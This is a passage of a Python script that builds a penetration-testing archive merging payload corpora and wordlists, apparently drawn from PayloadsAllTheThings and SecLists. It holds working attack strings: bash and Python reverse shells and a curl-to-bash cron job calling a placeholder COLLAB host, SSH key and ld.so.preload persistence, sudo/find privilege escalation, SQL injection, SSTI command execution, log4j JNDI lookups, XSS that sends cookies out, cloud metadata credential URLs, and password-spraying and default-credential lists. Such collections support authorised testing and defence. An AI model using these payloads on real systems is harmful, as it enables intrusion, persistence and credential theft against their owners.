    { "payload_id": "PL-INFRA-0031", "cwe_id": "CWE-444", "context": "network", "surface": "header", "engine": "http", "payload": "Content-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n", "severity": "medium", "tags": ["request-smuggling", "desync"], "classification": "T1" },
    { "payload_id": "PL-INFRA-0040", "cwe_id": "CWE-295", "context": "network", "surface": "header", "engine": "smtp", "payload": "STARTTLS", "severity": "low", "tags": ["starttls-strip"], "classification": "T0" }
  ]
}
'''.lstrip()

FILES["02-payloads/os/linux/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-OS-LINUX",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15", "secondary": "GTFOBINS@master@2026-01-12" },
  "payloads": [
    { "payload_id": "PL-OS-LNX-0001", "cwe_id": "CWE-78", "context": "command", "surface": "stdin", "engine": "bash", "payload": "bash -i >& /dev/tcp/COLLAB/4444 0>&1", "severity": "critical", "tags": ["reverse-shell"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0002", "cwe_id": "CWE-78", "context": "command", "surface": "stdin", "engine": "python3", "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"COLLAB\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "severity": "critical", "tags": ["reverse-shell", "python"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0003", "cwe_id": "CWE-269", "context": "file", "surface": "authorized_keys", "engine": "ssh", "payload": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOLLAB attacker@lab", "severity": "critical", "tags": ["persistence"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0004", "cwe_id": "CWE-732", "context": "cron", "surface": "file", "engine": "cron", "payload": "* * * * * root curl -s http://COLLAB/x.sh | bash", "severity": "critical", "tags": ["persistence", "cron"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0005", "cwe_id": "CWE-269", "context": "file", "surface": "ld.so.preload", "engine": "glibc", "payload": "/tmp/.x.so", "severity": "critical", "tags": ["persistence", "rootkit"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0006", "cwe_id": "CWE-732", "context": "file", "surface": "shell-profile", "engine": "bash", "payload": "export PATH=/tmp:$PATH  # in ~/.bashrc", "severity": "high", "tags": ["hijack", "path"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0007", "cwe_id": "CWE-250", "context": "file", "surface": "sudoers", "engine": "sudo", "payload": "user ALL=(ALL) NOPASSWD: /usr/bin/find", "severity": "critical", "tags": ["privesc", "misconfiguration"], "classification": "T2" },
    { "payload_id": "PL-OS-LNX-0008", "cwe_id": "CWE-78", "context": "command", "surface": "argument", "engine": "find", "payload": "find . -exec /bin/sh -p \\; -quit", "severity": "critical", "tags": ["privesc", "gtfobins"], "classification": "T2" }
  ]
}
'''.lstrip()

FILES["02-payloads/cloud/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-CLOUD",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-CLOUD-0001", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/user-data", "severity": "critical", "tags": ["metadata", "user-data", "credentials"], "classification": "T1" },
    { "payload_id": "PL-CLOUD-0002", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "severity": "critical", "tags": ["metadata", "iam-credentials"], "classification": "T2" },
    { "payload_id": "PL-CLOUD-0003", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "gcp", "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "severity": "critical", "tags": ["metadata", "oauth-token"], "classification": "T2" },
    { "payload_id": "PL-CLOUD-0004", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "azure", "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "severity": "critical", "tags": ["metadata", "managed-identity"], "classification": "T2" },
    { "payload_id": "PL-CLOUD-0010", "cwe_id": "CWE-200", "context": "url", "surface": "parameter", "engine": "k8s", "payload": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "severity": "critical", "tags": ["k8s", "service-account", "secrets"], "classification": "T2" },
    { "payload_id": "PL-CLOUD-0011", "cwe_id": "CWE-200", "context": "url", "surface": "parameter", "engine": "k8s", "payload": "https://kubernetes.default.svc/api/v1/pods?fieldSelector=spec.nodeName=NODE", "severity": "high", "tags": ["k8s", "pods"], "classification": "T1" },
    { "payload_id": "PL-CLOUD-0020", "cwe_id": "CWE-284", "context": "url", "surface": "parameter", "engine": "azure", "payload": "https://management.azure.com/subscriptions?api-version=2022-12-01", "severity": "high", "tags": ["azure", "enumeration"], "classification": "T1" }
  ]
}
'''.lstrip()

FILES["02-payloads/mobile/payloads.json"] = r'''
{
  "schema": "12-schemas/payload.schema.json",
  "corpus_id": "PL-MOBILE",
  "version": "1.0.0",
  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
  "payloads": [
    { "payload_id": "PL-MOB-0001", "cwe_id": "CWE-939", "context": "deeplink", "surface": "uri", "engine": "android", "payload": "app://deeplink?url=https://evil.example", "severity": "medium", "tags": ["deeplink", "open-redirect"], "classification": "T0" },
    { "payload_id": "PL-MOB-0002", "cwe_id": "CWE-502", "context": "ipc", "surface": "intent-extra", "engine": "android", "payload": "intent://scan/#Intent;scheme=zxing;package=com.example;end", "severity": "medium", "tags": ["intent", "component-exported"], "classification": "T0" },
    { "payload_id": "PL-MOB-0003", "cwe_id": "CWE-926", "context": "exposure", "surface": "backup", "engine": "android", "payload": "adb backup -f backup.ab com.example.app", "severity": "high", "tags": ["backup", "data-extraction"], "classification": "T1" },
    { "payload_id": "PL-MOB-0004", "cwe_id": "CWE-312", "context": "storage", "surface": "file", "engine": "android", "payload": "/sdcard/Android/data/com.example.app/files/token", "severity": "high", "tags": ["insecure-storage"], "classification": "T1" },
    { "payload_id": "PL-MOB-0005", "cwe_id": "CWE-359", "context": "ipc", "surface": "pasteboard", "engine": "ios", "payload": "pbpaste:// clipboard content read by app", "severity": "low", "tags": ["clipboard"], "classification": "T0" },
    { "payload_id": "PL-MOB-0006", "cwe_id": "CWE-319", "context": "network", "surface": "header", "engine": "ios", "payload": "ATS exception: NSAllowsArbitraryLoads", "severity": "medium", "tags": ["cleartext", "ats"], "classification": "T0" },
    { "payload_id": "PL-MOB-0007", "cwe_id": "CWE-295", "context": "network", "surface": "certificate", "engine": "android", "payload": "custom TrustManager accepting all certificates", "severity": "high", "tags": ["tls-bypass"], "classification": "T0" },
    { "payload_id": "PL-MOB-0008", "cwe_id": "CWE-841", "context": "component", "surface": "activity", "engine": "android", "payload": "android:exported=true android:permission=none", "severity": "high", "tags": ["exported-component"], "classification": "T0" }
  ]
}
'''.lstrip()

FILES["02-payloads/templates/payload.template.json"] = r'''
{
  "$schema": "../../12-schemas/payload.schema.json",
  "payload_id": "PL-<DOMAIN>-<NNNN>",
  "cwe_id": "CWE-00",
  "context": "query|identifier|numeric|header|cookie|url|xml|template|command|file|ipc|deeplink|ldap|nosql|jndi|rce|network|other",
  "surface": "body|parameter|header|cookie|url|path|stdin|argument|file|uri|ipc|intent-extra|backup|activity|certificate|jndi",
  "engine": "generic|mysql|postgresql|mssql|oracle|sqlite|php|jinja2|twig|freemarker|velocity|erb|handlebars|el|log4j|aws|gcp|azure|k8s|android|ios|bash|python3|cron|ssh|sudo|find|http|smtp|mongodb|openldap|graphql|none",
  "payload": "THE PAYLOAD ITSELF",
  "severity": "critical|high|medium|low|info",
  "classification": "T0|T1|T2",
  "tags": ["tag-a", "tag-b"],
  "notes": "Why this works, prerequisites, safe alternative",
  "provenance": {
    "source": "PAT",
    "ref": "master@2026-01-15"
  },
  "crosswalk": {
    "fuzz_wordlist": "03-wordlists/web/fuzzing/<file>.txt",
    "detections": ["3001001", "86610"],
    "playbook": "01-intel/playbooks/web/sql-injection.md",
    "module": "05-engines/sqlmap"
  }
}
'''.lstrip()

# ===========================================================================
# 03-wordlists
# ===========================================================================

FILES["03-wordlists/index/README.md"] = r'''
# Unified Corpus Index

`03-wordlists/index/wordlist.db` is the single optimised database that every
tool in the archive reads. It merges two corpora that upstream keep separate:

* **SecLists** - flat text files: one token per line.
* **PayloadsAllTheThings** - structured JSON records with CWE, context and
  surface metadata.

## 1. Schema

```
CREATE TABLE token (
    token_id     INTEGER PRIMARY KEY,
    token        TEXT NOT NULL,
    surface      TEXT NOT NULL,          -- parameter|header|cookie|url|path|body
    length       INTEGER NOT NULL,
    sha256       TEXT NOT NULL,
    UNIQUE (sha256, surface)
);

CREATE TABLE payload (
    payload_id   TEXT PRIMARY KEY,
    token_id     INTEGER NOT NULL REFERENCES token(token_id),
    cwe_id       TEXT NOT NULL,
    context      TEXT NOT NULL,
    engine       TEXT,
    severity     TEXT NOT NULL,
    classification TEXT NOT NULL,
    tags         TEXT NOT NULL           -- JSON array
);

CREATE TABLE fuzz_token (
    token_id     INTEGER NOT NULL REFERENCES token(token_id),
    payload_id   TEXT    NOT NULL REFERENCES payload(payload_id),
    origin       TEXT    NOT NULL CHECK (origin IN ('fuzz','payload','both')),
    confidence   REAL    NOT NULL CHECK (confidence BETWEEN 0.0 AND 1.0),
    PRIMARY KEY (token_id, payload_id)
);

CREATE TABLE evasion (
    evasion_id   TEXT PRIMARY KEY,
    platform     TEXT NOT NULL,
    binary       TEXT NOT NULL,
    technique_id TEXT NOT NULL,
    primitive    TEXT NOT NULL
);

CREATE VIRTUAL TABLE token_fts USING fts5(token, content='token', content_rowid='token_id');

CREATE INDEX ix_payload_cwe   ON payload(cwe_id, context);
CREATE INDEX ix_fuzz_conf     ON fuzz_token(confidence);
CREATE INDEX ix_evasion_tech  ON evasion(technique_id);
```

## 2. The merge rule

A SecLists line and a PayloadsAllTheThings payload unify when **all** of these
hold:

1. `sha256(normalised_token)` is equal - normalisation = strip, collapse
   internal whitespace, unquote, NFC unicode.
2. `surface` is equal.
3. `cwe_id` and `context` are equal, or the wordlist entry is `surface`-only and
   inherits the payload's `cwe_id`/`context` (this is the `origin='fuzz'` case).

Unified rows get `origin='both'` and `confidence=1.0`; single-source rows keep
`0.6` (payload-only) or `0.4` (wordlist-only).

## 3. Queries

```sql
-- all injection tokens for a PHP parameter, deduped
SELECT DISTINCT t.token, p.context, f.origin, f.confidence
FROM   fuzz_token f
JOIN   token      t ON t.token_id   = f.token_id
JOIN   payload    p ON p.payload_id = f.payload_id
WHERE  p.cwe_id='CWE-89' AND t.surface='parameter'
ORDER  BY f.confidence DESC, LENGTH(t.token);

-- surfaces not covered by any payload (blind spot report)
SELECT DISTINCT t.token, t.surface
FROM token t LEFT JOIN fuzz_token f ON f.token_id=t.token_id
WHERE f.token_id IS NULL;

-- coverage of the injection corpus
SELECT cwe_id, COUNT(*) n FROM payload GROUP BY cwe_id ORDER BY n DESC;
```

## 4. Building and verifying

```bash
python tools/ssactl.py index --root .            # build
python tools/ssactl.py index --root . --check    # fail if the DB is stale
python tools/ssactl.py index --root . --stats    # human readable summary
```

`--check` compares the content hash recorded in
`00-governance/manifests/ssa-manifest.json` against the DB and exits `2` when
they diverge - that is the `INDEX-001` gate.

## 5. Consumers

| Consumer | Query |
|---|---|
| `ffuf` | `SELECT token FROM token WHERE surface='path' AND length BETWEEN 3 AND 12` |
| `sqlmap` | `--tamper` selection from `payload.context` |
| `hydra` | `SELECT token FROM token WHERE surface='parameter' AND cwe_id IS NULL` (username set) |
| Sigma generation | `SELECT payload_id, cwe_id FROM payload` joined with `fuzz_token` |

Note that `ffuf`, `sqlmap` and `hydra` cannot execute SQL. They consume the
derived exports written next to the DB:

* `03-wordlists/index/export/fuzz-words.txt`
* `03-wordlists/index/export/injection-contexts.csv`
'''.lstrip()

FILES["03-wordlists/index/schema.sql"] = r'''
-- Sovereign Security Archive - unified corpus index
-- Generated by tools/ssactl.py index; edit schema.py, not this file, or the
-- next `index` run will overwrite your change. This copy exists so DBAs can
-- inspect and hand-create the database without running Python.

PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;

DROP TABLE IF EXISTS fuzz_token;
DROP TABLE IF EXISTS payload;
DROP TABLE IF EXISTS token;
DROP TABLE IF EXISTS evasion;
DROP TABLE IF EXISTS index_meta;

CREATE TABLE token (
    token_id  INTEGER PRIMARY KEY,
    token     TEXT    NOT NULL,
    surface   TEXT    NOT NULL,
    length    INTEGER NOT NULL,
    sha256    TEXT    NOT NULL,
    source    TEXT    NOT NULL,
    UNIQUE (sha256, surface)
);

CREATE TABLE payload (
    payload_id     TEXT PRIMARY KEY,
    token_id       INTEGER NOT NULL REFERENCES token(token_id),
    cwe_id         TEXT    NOT NULL,
    context        TEXT    NOT NULL,
    engine         TEXT,
    severity       TEXT    NOT NULL CHECK (severity IN ('critical','high','medium','low','info')),
    classification TEXT    NOT NULL CHECK (classification IN ('T0','T1','T2')),
    tags           TEXT    NOT NULL
);

CREATE TABLE fuzz_token (
    token_id   INTEGER NOT NULL REFERENCES token(token_id),
    payload_id TEXT    NOT NULL REFERENCES payload(payload_id),
    origin     TEXT    NOT NULL CHECK (origin IN ('fuzz','payload','both')),
    confidence REAL    NOT NULL CHECK (confidence BETWEEN 0.0 AND 1.0),
    PRIMARY KEY (token_id, payload_id)
);

CREATE TABLE evasion (
    evasion_id   TEXT PRIMARY KEY,
    platform     TEXT NOT NULL,
    binary       TEXT NOT NULL,
    technique_id TEXT NOT NULL,
    primitive    TEXT NOT NULL
);

CREATE TABLE index_meta (
    key   TEXT PRIMARY KEY,
    value TEXT NOT NULL
);

CREATE VIRTUAL TABLE token_fts USING fts5(token, content='token', content_rowid='token_id');

CREATE INDEX ix_payload_cwe  ON payload(cwe_id, context);
CREATE INDEX ix_fuzz_origin  ON fuzz_token(origin, confidence);
CREATE INDEX ix_evasion_tech ON evasion(technique_id);
CREATE INDEX ix_token_surface ON token(surface, length);

INSERT INTO index_meta(key, value) VALUES ('schema_version', '1.0.0');
INSERT INTO index_meta(key, value) VALUES ('generator', 'ssactl');
'''.lstrip()

FILES["03-wordlists/index/export/injection-contexts.csv"] = r'''
cwe_id,context,engine,payload_id,surface,severity,classification,wordlist_file
CWE-89,query,generic,PL-WEB-SQLI-0001,parameter,high,T0,injection-words.txt
CWE-89,query,generic,PL-WEB-SQLI-0002,parameter,high,T0,injection-words.txt
CWE-89,query,mysql,PL-WEB-SQLI-0003,parameter,high,T0,injection-words.txt
CWE-89,query,generic,PL-WEB-SQLI-0004,parameter,high,T0,injection-words.txt
CWE-89,numeric,generic,PL-WEB-SQLI-0006,parameter,high,T0,injection-words.txt
CWE-89,identifier,generic,PL-WEB-SQLI-0010,parameter,info,T0,injection-words.txt
CWE-89,query,generic,PL-WEB-SQLI-0020,parameter,high,T0,injection-words.txt
CWE-89,query,mssql,PL-WEB-SQLI-0082,parameter,medium,T1,injection-words.txt
CWE-89,header,generic,PL-WEB-SQLI-0090,header,high,T0,injection-words.txt
CWE-89,cookie,generic,PL-WEB-SQLI-0091,cookie,high,T0,injection-words.txt
CWE-79,html-text,none,PL-WEB-XSS-0001,parameter,high,T0,xss-words.txt
CWE-79,html-text,none,PL-WEB-XSS-0002,parameter,high,T0,xss-words.txt
CWE-79,script,none,PL-WEB-XSS-0006,parameter,high,T0,xss-words.txt
CWE-918,url,none,PL-WEB-SSRF-0001,url,medium,T0,ssrf-words.txt
CWE-918,url,aws,PL-WEB-SSRF-0010,url,critical,T1,ssrf-words.txt
CWE-90,ldap,openldap,PL-INFRA-0002,parameter,critical,T1,injection-words.txt
CWE-20,nosql,mongodb,PL-INFRA-0010,body,critical,T1,injection-words.txt
CWE-1336,template,jinja2,PL-WEB-SSTI-0001,parameter,medium,T0,ssti-words.txt
CWE-502,jndi,log4j,PL-INFRA-0020,jndi,critical,T2,injection-words.txt
'''.lstrip()

FILES["03-wordlists/web/fuzzing/injection-words.txt"] = r'''
# SQLi / NoSQLi / LDAPi fuzz tokens.
# provenance: SECLISTS@master@2026-01-14 (Discovery/Web-Content/SQL-Injection)
# crosswalk:  10-crosswalk/wordlist-payload/crosswalk.csv
# surface:    parameter   cwe: CWE-89
'
''
'#
'-- -
' OR '1'='1
' OR '1'='1'-- -
' OR '1'='1'#
' OR 1=1-- -
' OR 1=1#
' OR ""='
' OR ''='
' OR 1=1 LIMIT 1-- -
' OR 1=1 LIMIT 1#
admin'-- -
admin'#
') OR ('1'='1
')) OR (('1'='1
\" OR \"1\"=\"1
1 OR 1=1
1' OR '1'='1
1' OR '1'='1'-- -
1 AND 1=1
1 AND 1=2
' ORDER BY 1-- -
' ORDER BY 10-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
' UNION SELECT user(),version()-- -
' AND 1=1-- -
' AND 1=2-- -
' AND SLEEP(5)-- -
' AND pg_sleep(5)-- -
' AND benchmark(5000000,MD5(1))-- -
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND updatexml(1,concat(0x7e,version()),1)-- -
'; WAITFOR DELAY '0:0:5'-- -
'; SELECT 1-- -
'; EXEC xp_cmdshell('whoami')-- -
' AND 1=CAST((SELECT version()) AS int)-- -
%27
%27%20OR%201%3D1--
\";SELECT 1--
{ "$ne": null }
{"$ne": null}
{ "username": { "$ne": null }, "password": { "$ne": null } }
{ "username": "admin", "password": { "$gt": "" } }
admin)(|(password=*
*)(objectClass=*
*)(uid=*))(|(uid=*
${jndi:ldap://COLLAB/a}
' UNION SELECT LOAD_FILE(0x5c5c5c5c5c43f414e545348454c4c43f5c746578742e747874)-- -
'''.lstrip()

FILES["03-wordlists/web/fuzzing/xss-words.txt"] = r'''
# Cross-site scripting fuzz tokens.
# provenance: SECLISTS@master@2026-01-14 + PAT@master@2026-01-15
# surface: parameter / header   cwe: CWE-79
<script>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
</script><img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" onmouseover=alert(1) x="
' onmouseover=alert(1) x='
" onfocus=alert(1) autofocus="
javascript:alert(1)
JaVaScRiPt:alert(1)
'-alert(1)-'
";alert(1);//
\");alert(1);//
{{7*7}}
${7*7}}
<%25=7*7%25>
{{constructor.constructor('alert(1)')()}}
<img src=x onerror=fetch('//COLLAB/?c='+document.cookie)>
<form action="//COLLAB"><input name=c><input type=submit>
'''.lstrip()

FILES["03-wordlists/web/fuzzing/ssrf-words.txt"] = r'''
# SSRF target fuzz tokens.
# provenance: PAT@master@2026-01-15
# surface: url   cwe: CWE-918
http://127.0.0.1/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://127.0.0.1:11211/
http://0/
http://[::1]/
http://[::]/
http://2130706433/
http://017700000001/
http://0x7f000001/
http://0x7f.0.0.1/
http://127.1/
http://localhost/
http://localtest.me/
http://127.0.0.1.nip.io/
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
file:///etc/passwd
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
gopher://127.0.0.1:6379/_INFO%20ALL%20KEYS
dict://127.0.0.1:11211/stats
'''.lstrip()

FILES["03-wordlists/web/fuzzing/ssti-words.txt"] = r'''
# Server-side template injection probe tokens.
# provenance: PAT@master@2026-01-15
# surface: parameter   cwe: CWE-1336
{{7*7}}
${{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{7*'7'}}
{{config}}
{{config.items()}}
{{self.__init__.__globals__}}
{{request.application.__self__.__init__.__globals__['os'].popen('id').read()}}
${{T(java.lang.Runtime).getRuntime().exec('id')}}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{constructor.constructor('alert(1)')()}}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
${jndi:ldap://COLLAB/a}
#set($x=7*7)$x
'''.lstrip()

FILES["03-wordlists/web/content-words.txt"] = r'''
# Web content discovery dictionary (curated subset of the SecLists corpus).
# provenance: SECLISTS@master@2026-01-14
# usage: ffuf -w content-words.txt -u https://TARGET/FUZZ -mc all -ac
.git/HEAD
.git/config
.env
.env.local
.env.production
.svn/entries
.well-known/security.txt
.well-known/openid-configuration
.well-known/jwks.json
.well-known/acme-challenge
actuator
actuator/env
actuator/health
actuator/info
actuator/heapdump
actuator/mappings
admin
admin/login
administrator
api
api/docs
api/v1
api/v2
api/health
api/swagger.json
api/openapi.json
backup
backup.sql
backup.tar.gz
bin
build
cgi-bin
config
config.json
config.php
config.yml
console
crossdomain.xml
db
debug
dev
docker-compose.yml
docs
download
dump
env
error
graphql
graphiql
health
healthcheck
images
img
index.php
info
install
js
log
login
logout
logs
manager
metrics
old
panel
phpmyadmin
private
prod
public
readme.md
register
robots.txt
server-status
sitemap.xml
sql
src
static
stats
status
swagger
swagger-ui.html
swagger.json
temp
test
tmp
upload
uploads
user
users
vendor
version
web.config
webmail
wp-admin
wp-config.php
wp-content
wp-login.php
'''.lstrip()

FILES["03-wordlists/web/usernames.txt"] = r'''
# Username candidates. provenance: SECLISTS@master@2026-01-14
# NOTE: usage of this list against third-party systems may violate privacy or
# computer-misuse law. See 00-governance/charter.md section 7.
admin
administrator
administrator
root
user
test
guest
info
support
sales
contact
webmaster
postmaster
hostmaster
abuse
security
noc
devops
dev
developer
engineer
ops
dev1
dev2
qa
staging
jenkins
git
svn
deploy
ansible
terraform
backup
ftp
www
web
app
service
svc
db
dbadmin
mysql
postgres
tomcat
oracle
administrator1
manager
operator
'''.lstrip()

FILES["03-wordlists/credentials/common-passwords.txt"] = r'''
# Top-of-list common passwords for spraying. provenance: SECLISTS@master@2026-01-14
# Fragment of a public breach-derived corpus (classification T1 - see
# 00-governance/data-classification.md). Never use against third-party systems.
123456
password
123456789
12345678
12345
qwerty
1234567
111111
123123
abc123
1234
iloveyou
000000
qwerty123
zaq12wsx
dragon
sunshine
princess
football
letmein
monkey
shadow
master
qwertyuiop
654321
superman
qazwsx
michael
login
starwars
solo
passw0rd
whatever
trustno1
changeme
Password1
P@ssw0rd
Welcome1
Admin123
admin123
root123
Summer2024
Winter2023
Company123
'''.lstrip()

FILES["03-wordlists/credentials/defaults.txt"] = r'''
# Appliance and product default credentials.
# provenance: SECLISTS@master@2026-01-14   classification: T1
admin:admin
admin:password
admin:1234
admin:12345
admin:
root:root
root:toor
root:
user:user
guest:guest
pi:raspberry
ubuntu:ubuntu
cisco:cisco
cisco:cisco123
admin:cisco
enable:cisco
Administrator:Password123
Administrator:
sa:
postgres:postgres
mysql:mysql
oracle:oracle
tomcat:tomcat
jenkins:jenkins
ftp:ftp
'''.lstrip()

FILES["03-wordlists/discovery/dns/subdomains.txt"] = r'''
# Subdomain bruteforce dictionary (curated subset).
# provenance: SECLISTS@master@2026-01-14   surface: host
www
mail
remote
blog
webmail
server
ns1
ns2
ns3
ns4
smtp
secure
vpn
m
shop
ftp
mail2
test
portal
ns
ww1
host
support
dev
web
bbs
ww42
mx
email
cloud
1
mail1
2
forum
owa
www2
gw
admin
store
mobile
mx1
cdn
api
dev1
app
www3
db
test1
beta
demo
stage
preprod
uat
prod
internal
intranet
vpn2
gateway
gw2
ldap
sso
idp
kibana
grafana
prometheus
k8s
kafka
redis
mongo
jenkins
gitlab
jira
confluence
'''.lstrip()

FILES["03-wordlists/network/ports.txt"] = r'''
# Service port dictionary. provenance: SECLISTS@master@2026-01-14
# usage: nmap -p- does not need this; use it for service triage lists.
7
9
13
20
21
22
23
25
37
53
69
79
80
81
88
102
110
111
113
119
123
135
137
138
139
143
161
179
389
443
445
465
512
513
514
515
543
544
548
554
587
631
636
646
873
990
993
995
1080
1099
1433
1434
1521
1723
1883
2049
2181
2375
2376
3000
3128
3268
3306
3389
3690
4000
4443
4444
5000
5060
5432
5601
5672
5900
5984
5985
6379
6443
7001
7070
7443
8000
8008
8009
8080
8081
8088
8443
8888
9000
9001
9090
9200
9300
10000
10250
11211
15672
27017
27018
28017
50000
'''.lstrip()

FILES["03-wordlists/network/banners.txt"] = r'''
# Banner-grabbing dictionary and product grep patterns.
# provenance: SECLISTS@master@2026-01-14 + h4cker@master@2026-01-09
Apache
nginx
Microsoft-IIS
OpenSSH
ssh-2.0
vsftpd
ProFTPD
FileZilla
Samba
smb
PostgreSQL
MySQL
MongoDB
Redis
PostgreSQL DB
Microsoft SQL Server
Oracle Database
Kibana
Grafana
Jenkins
GitLab
Kubernetes
Docker
kube-apiserver
Jetty
Tomcat
JBoss
WebLogic
WebSphere
Gunicorn
uWSGI
OpenResty
Lighttpd
CouchDB
Elasticsearch
InfluxDB
RabbitMQ
Zookeeper
etcd
Vault
'''.lstrip()

FILES["03-wordlists/api/api-endpoints.txt"] = r'''
# REST/GraphQL endpoint dictionary. provenance: PAT@master@2026-01-15 + h4cker
# usage: ffuf -w api-endpoints.txt -u https://TARGET/api/FUZZ -mc all -ac
v1
v2
v3
api
auth
login
logout
token
refresh
register
users
user
account
profile
me
admin
settings
config
status
health
healthz
ready
live
info
version
metrics
stats
graphql
graphiql
playground
schema
introspect
query
mutation
subscription
search
query
list
get
create
update
delete
upload
download
export
import
files
file
documents
document
reports
report
logs
audit
events
webhooks
notifications
invoices
invoice
payments
payment
orders
order
products
product
cart
checkout
subscriptions
keys
apikeys
tokens
sessions
permissions
roles
teams
projects
issues
pulls
repos
branches
commits
runners
jobs
builds
artifacts
pipelines
deployments
secrets
cluster
nodes
namespaces
'''.lstrip()

FILES["03-wordlists/tls/jwt-secrets.txt"] = r'''
# Weak HMAC secrets for JWT testing. provenance: PAT + h4cker
# classification: T0 - these are intentionally weak values, not real secrets.
secret
Secret
SECRET
password
Password
passwd
jwt
jwtsecret
jwt-secret
jwt_secret
token
tokenSecret
key
keySecret
privatekey
signingkey
signing-key
supersecret
changeme
changeit
default
test
testing
development
dev
staging
production
s3cr3t
S3cr3t
my-secret
my_secret
app-secret
app_secret
your-256-bit-secret
your_256_bit_secret
your-very-secure-secret
shhhhh
shhhhhhhhhhhhhhhhhh
abc123
123456
qwerty
'''.lstrip()